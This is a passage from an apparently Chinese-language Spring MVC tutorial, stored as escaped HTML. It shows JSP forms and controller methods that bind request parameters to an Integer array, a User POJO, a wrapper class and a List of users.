class=&quot;hljs-string&quot;&gt;&quot;checkbox&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ids&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ids&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;ID：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;checkbox&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ids&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ids&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;ID：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;checkbox&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ids&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;3&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ids&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveArray&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveArray(Integer[] ids) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(ids);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h94pojo&quot;&gt;&lt;span&gt;&lt;strong&gt;9.4、封装pojo类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;创建一个pojo类：&lt;/p&gt;
&lt;pre readability=&quot;9&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;12&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;User&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer id;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String username;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String age;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Date birthday;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String address;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;hljs-title&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; id;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setId&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Integer id)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.id = id;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getUsername&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; username;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setUsername&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String username)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.username = username;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getAge&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; age;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setAge&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String age)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.age = age;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Date &lt;span class=&quot;hljs-title&quot;&gt;getBirthday&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; birthday;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setBirthday&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Date birthday)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.birthday = birthday;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getAddress&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; address;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setAddress&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String address)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.address = address;&lt;br/&gt;}&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;User [id=&quot;&lt;/span&gt; + id + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, username=&quot;&lt;/span&gt; + username + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, age=&quot;&lt;/span&gt; + age + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, birthday=&quot;&lt;/span&gt; + birthday + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, address=&quot;&lt;/span&gt;&lt;br/&gt;+ address + &lt;span class=&quot;hljs-string&quot;&gt;&quot;]&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveUser.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;年龄：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;生日：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;birthday&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;birthday&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;地址：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;address&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;address&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveUser&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveString(User user) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(user);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h94&quot;&gt;&lt;span&gt;&lt;strong&gt;9.4、封装包装类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;创建一个包装类：&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code class=&quot;hljs cpp&quot; readability=&quot;4&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;UserCustom&lt;/span&gt; {&lt;/span&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; User user;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; User &lt;span class=&quot;hljs-title&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; user;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setUser&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(User user)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.user = user;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveUserCustom.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;user.username&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;年龄：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;user.age&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;生日：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;user.birthday&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;birthday&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;地址：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;user.address&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;address&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveUserCustom&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveUserCustom(UserCustom userCustom) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(userCustom);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h95&quot;&gt;&lt;span&gt;&lt;strong&gt;9.5、封装集合类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h951list&quot;&gt;&lt;span&gt;&lt;strong&gt;9.5.1、封装List集合类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;code&gt;不能直接传递集合类型，需要把集合类型封装到包装类中。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我们先把List集合封装到包装类中。即：在包装类中定义List集合。提供getter和setter方法。&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code class=&quot;hljs cs&quot; readability=&quot;4&quot;&gt;    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; List&amp;lt;User&amp;gt; userList;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; List&amp;lt;User&amp;gt; &lt;span class=&quot;hljs-title&quot;&gt;getUserList&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; userList;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setUserList&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;List&amp;lt;User&amp;gt; userList&lt;/span&gt;) &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.userList = userList;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;3&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveList.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;userList[0].username&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;年龄：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span 